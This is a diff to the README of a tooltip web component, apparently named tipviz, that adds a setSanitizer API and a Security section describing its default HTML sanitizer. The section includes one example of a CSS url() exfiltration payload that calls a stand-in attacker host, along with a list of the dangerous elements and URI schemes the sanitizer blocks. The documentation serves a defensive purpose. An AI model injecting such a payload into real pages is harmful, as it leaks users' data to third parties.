@@ -55,15 +55,32 @@ const tooltip = document.getElementById('tooltip');
 
 - **`setStyles`**: Applies scoped CSS to the component. Internally it uses the `CSSStyleSheet.replaceSync()` API with `adoptedStyleSheets`. If the browser does not support it, it falls back to injecting a `<style>` element inside the shadow root.
 
-  ```ts
-  setStyles(cssString: string): void;
-  ```
+   ```ts
+   setStyles(cssString: string): void;
+   ```
+
+- **`setSanitizer`**: Sets a custom sanitizer function to override the default HTML sanitization. Pass `null` to disable sanitization (only for trusted HTML content). The default sanitizer removes dangerous elements, strips event handler attributes, blocks malicious URI schemes, and strips all `url()` calls from inline `style` attributes to prevent CSS-based data exfiltration.
+
+   ```ts
+   setSanitizer(fn: SanitizerFn | null): void;
+   ```
+
+   Example with custom sanitizer:
+
+   ```ts
+   import { sanitize } from "tipviz";
+
+   tooltip.setSanitizer((html) => {
+     // Apply your own sanitization logic
+     return sanitize(html);
+   });
+   ```
 
 - **`show`**: Displays the tooltip with the provided `data` and positions it relative to the `target` element.
 
-  ```ts
-  show(data: any, target: Element): void;
-  ```
+   ```ts
+   show(data: any, target: Element): void;
+   ```
 
 - **`hide`**: Hides the tooltip and dispatches a bubbling, composed `hide` event.
 
@@ -186,6 +203,62 @@ type DirectionFn = (...args: any[]) => Direction;
 ```
 
 Callback used by `setDirection` to determine the desired `Direction` given the `data` and `target`.
+
+---
+
+## Security
+
+### HTML Sanitization
+
+The `TipVizTooltip` component includes a built-in HTML sanitizer that runs automatically when content is passed to `show()`. The sanitizer:
+
+- **Removes dangerous elements**: `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `<base>`, `<form>`, `<input>`, `<button>`, `<textarea>`, `<select>`
+- **Strips event handler attributes**: Any attribute matching `on*` (e.g., `onclick`, `onerror`, `onload`), plus `srcdoc` and `formaction`
+- **Blocks malicious URI schemes**: Removes `javascript:` URIs and `data:` URIs that are not images (`data:image/*`)
+- **Strips `url()` from inline styles**: All CSS `url()` calls in `style` attributes are replaced with empty `url()` tokens to prevent CSS-based data exfiltration attacks
+
+#### Example: CSS URL Injection Prevention
+
+Without sanitization, this malicious HTML would trigger a network request:
+
+```html
+<div style="background: url(https://attacker.com/steal?data=SECRET)">tooltip</div>
+```
+
+After sanitization, it becomes:
+
+```html
+<div style="background: url()">tooltip</div>
+```
+
+No network request is made, and the browser silently ignores the invalid `url()`.
+
+### Custom Sanitization
+
+If you need different sanitization rules, override the sanitizer via `setSanitizer()`:
+
+```ts
+import { sanitize } from "tipviz";
+
+tooltip.setSanitizer((html) => {
+  // Use the built-in sanitizer
+  const cleaned = sanitize(html);
+  // Apply additional transformations if needed
+  return cleaned;
+});
+
+// Or disable sanitization for trusted content only
+tooltip.setSanitizer(null); // Passes HTML through unchanged
+```
+
+### Untrusted Content Best Practices
+
+When using `setHtml()` with untrusted or user-supplied data:
+
+1. Always use the default sanitizer or provide your own
+2. Avoid interpolating sensitive data (tokens, API keys) into tooltip content
+3. If you must display user data, escape or sanitize it before passing to `setHtml()`
+4. Consider combining with a Content Security Policy (CSP) for defense-in-depth
 
 ---
 
